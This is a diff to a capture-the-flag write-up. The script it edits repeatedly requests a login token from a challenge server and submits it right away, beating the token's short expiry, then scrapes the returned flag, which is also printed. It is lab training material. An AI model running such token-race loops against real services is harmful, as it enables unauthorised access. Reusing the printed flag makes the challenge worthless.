@@ -11,11 +11,17 @@ $ curl -X POST http://185.244.192.170:20018/generateLoginToken
 4. Ok, lets try to submit this token, hm invalid token. Maybe it's encoded? No in the json data is a expires attribute, lets write a python program to minimize the delay between the token generation and login request.
 
   ```python
-  import requests
+  import requests, bs4
 
   url = 'http://185.244.192.170:20018'
-  token = requests.post(f'{url}/generateLoginToken').json().get('token')
-  print(requests.post(f'{url}/login', data={'token': token}).text)
+  flag = ""
+
+  while 'TMT' not in flag:
+      token = requests.post(f'{url}/generateLoginToken').json().get('token')
+      flag = bs4.BeautifulSoup(requests.post(f'{url}/login', data={'token': token}).text, "html.parser").body.find_all("div", {"class": "alert"})[0].encode_contents().decode()
+
+  print(flag)
+
   ```
 
 5. Flag: `TMT{y32kTNmdLlBbm4rS1Ysx}`
